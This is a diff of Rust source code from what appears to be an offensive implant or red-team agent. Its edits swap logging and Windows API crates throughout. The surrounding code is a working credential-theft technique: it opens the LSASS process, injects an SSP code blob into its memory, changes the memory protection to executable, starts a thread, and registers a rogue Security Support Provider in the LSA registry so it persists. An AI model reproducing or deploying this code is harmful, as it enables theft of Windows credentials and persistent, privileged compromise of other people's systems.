@@ -95,7 +95,7 @@ fn generate_shm_name() -> Vec<u16> {
     use rand::RngCore;
 
     let psk = crate::outbound::resolve_secret().unwrap_or_else(|| {
-        log::warn!("lsa_whisperer_ssp: no PSK configured; SHM name uses random fallback");
+        tracing::warn!("lsa_whisperer_ssp: no PSK configured; SHM name uses random fallback");
         // Fall back to random bytes so the agent still works in dev/test.
         let mut ikm = [0u8; 32];
         rand::rngs::OsRng.fill_bytes(&mut ikm);
@@ -731,7 +731,7 @@ pub fn build_ssp_blob() -> Result<Vec<u8>> {
     blob.extend_from_slice(&nt_unmap_view.to_le_bytes());
     blob.extend_from_slice(&nt_close.to_le_bytes());
 
-    log::info!(
+    tracing::info!(
         "LSA Whisperer: SSP blob built ({} bytes, SHM name {} chars)",
         blob.len(),
         name_chars,
@@ -1074,7 +1074,7 @@ pub fn open_lsass_process() -> Result<usize> {
         ));
     }
 
-    log::info!("LSA Whisperer: opened LSASS process (PID={lsass_pid}, handle={process_handle:#x})");
+    tracing::info!("LSA Whisperer: opened LSASS process (PID={lsass_pid}, handle={process_handle:#x})");
 
     Ok(process_handle)
 }
@@ -1140,7 +1140,7 @@ pub fn inject_ssp_into_lsass(blob: &[u8]) -> Result<(usize, usize)> {
         ));
     }
 
-    log::info!(
+    tracing::info!(
         "LSA Whisperer: allocated {:#x} RW bytes in LSASS at {:#x}",
         blob.len(),
         base_addr
@@ -1205,7 +1205,7 @@ pub fn inject_ssp_into_lsass(blob: &[u8]) -> Result<(usize, usize)> {
     );
 
     if status < 0 {
-        log::warn!(
+        tracing::warn!(
             "LSA Whisperer: NtProtectVirtualMemory(RW→RX) failed: {status:#x}, proceeding with RW"
         );
         // Non-fatal: the code is still writable.  Continue — the SSP will
@@ -1277,7 +1277,7 @@ pub fn inject_ssp_into_lsass(blob: &[u8]) -> Result<(usize, usize)> {
         );
     }
 
-    log::info!(
+    tracing::info!(
         "LSA Whisperer: SSP blob injected into LSASS at {:#x}, initialization thread launched",
         base_addr
     );
@@ -1307,11 +1307,11 @@ pub fn free_lsass_memory(process_handle: usize, base_addr: usize) -> Result<()> 
     );
 
     if status < 0 {
-        log::warn!("LSA Whisperer: NtFreeVirtualMemory in LSASS failed: {status:#x}");
+        tracing::warn!("LSA Whisperer: NtFreeVirtualMemory in LSASS failed: {status:#x}");
         return Err(anyhow!("NtFreeVirtualMemory in LSASS failed: {status:#x}"));
     }
 
-    log::info!("LSA Whisperer: freed LSASS memory at {:#x}", base_addr);
+    tracing::info!("LSA Whisperer: freed LSASS memory at {:#x}", base_addr);
     Ok(())
 }
 
@@ -1373,17 +1373,17 @@ pub fn register_ssp_package() -> Result<()> {
         .chain(std::iter::once(0))
         .collect();
 
-    let mut hkey: winapi::shared::minwindef::HKEY = std::ptr::null_mut();
+    let mut hkey: crate::win_types::HKEY = std::ptr::null_mut();
     let err = unsafe {
-        winapi::um::winreg::RegOpenKeyExW(
-            winapi::um::winreg::HKEY_LOCAL_MACHINE,
+        windows_sys::Win32::System::Registry::RegOpenKeyExW(
+            windows_sys::Win32::System::Registry::HKEY_LOCAL_MACHINE,
             key_wide.as_ptr(),
             0,
-            winapi::um::winnt::KEY_QUERY_VALUE | winapi::um::winnt::KEY_SET_VALUE,
+            windows_sys::Win32::System::Registry::KEY_QUERY_VALUE | windows_sys::Win32::System::Registry::KEY_SET_VALUE,
             &mut hkey,
         )
     };
-    if err as u32 != winapi::shared::winerror::ERROR_SUCCESS {
+    if err as u32 != windows_sys::Win32::Foundation::ERROR_SUCCESS {
         return Err(anyhow!(
             "RegOpenKeyExW({LSA_KEY}) failed: win32 error {err:#x}"
         ));
@@ -1393,7 +1393,7 @@ pub fn register_ssp_package() -> Result<()> {
     let mut buf_len: u32 = 0;
     let mut reg_type: u32 = 0;
     unsafe {
-        winapi::um::winreg::RegQueryValueExW(
+        windows_sys::Win32::System::Registry::RegQueryValueExW(
             hkey,
             val_wide.as_ptr(),
             std::ptr::null_mut(),
@@ -1406,7 +1406,7 @@ pub fn register_ssp_package() -> Result<()> {
     // Allocate buffer and read.
     let mut buf: Vec<u8> = vec![0u8; buf_len as usize + (pkg_wide.len() * 2 + 2)];
     unsafe {
-        winapi::um::winreg::RegQueryValueExW(
+        windows_sys::Win32::System::Registry::RegQueryValueExW(
             hkey,
             val_wide.as_ptr(),
             std::ptr::null_mut(),
@@ -1445,9 +1445,9 @@ pub fn register_ssp_package() -> Result<()> {
     }
 
     if already_registered {
-        log::info!("LSA Whisperer: SSP package '{SSP_PACKAGE_NAME}' already registered");
+        tracing::info!("LSA Whisperer: SSP package '{SSP_PACKAGE_NAME}' already registered");
         unsafe {
-            winapi::um::winreg::RegCloseKey(hkey);
+            windows_sys::Win32::System::Registry::RegCloseKey(hkey);
         }
         return Ok(());
     }
@@ -1473,27 +1473,27 @@ pub fn register_ssp_package() -> Result<()> {
         unsafe { std::slice::from_raw_parts(new_value.as_ptr() as *const u8, new_value.len() * 2) };
 
     let err = unsafe {
-        winapi::um::winreg::RegSetValueExW(
+        windows_sys::Win32::System::Registry::RegSetValueExW(
             hkey,
             val_wide.as_ptr(),
             0,
-            winapi::um::winnt::REG_MULTI_SZ,
+            windows_sys::Win32::System::Registry::REG_MULTI_SZ,
             new_bytes.as_ptr(),
             new_bytes.len() as u32,
         )
     };
 
     unsafe {
-        winapi::um::winreg::RegCloseKey(hkey);
+        windows_sys::Win32::System::Registry::RegCloseKey(hkey);
     }
 
-    if err as u32 != winapi::shared::winerror::ERROR_SUCCESS {
+    if err as u32 != windows_sys::Win32::Foundation::ERROR_SUCCESS {
         return Err(anyhow!(
             "RegSetValueExW(Security Packages) failed: win32 error {err:#x}"
         ));
     }
 
-    log::info!(
+    tracing::info!(
         "LSA Whisperer: registered SSP package '{SSP_PACKAGE_NAME}' in LSA Security Packages"
     );
 
